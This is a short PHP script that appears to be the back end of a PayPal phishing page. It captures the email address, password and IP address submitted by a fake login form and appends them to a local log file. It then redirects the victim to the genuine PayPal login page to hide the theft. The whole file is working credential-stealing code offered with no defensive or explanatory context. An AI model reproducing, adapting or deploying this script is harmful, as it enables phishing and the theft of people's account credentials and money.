<?php
$conta = $_POST['login_email'];
$senha = $_POST['login_password'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email : ".$conta. "\nŞifre : ".$senha."\nİp Adresi: ".$ip."\n\n"; 

$fp = fopen("log.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
header("Location: https://www.paypal.com/en/cgi-bin/webscr?cmd=_login-run");
?>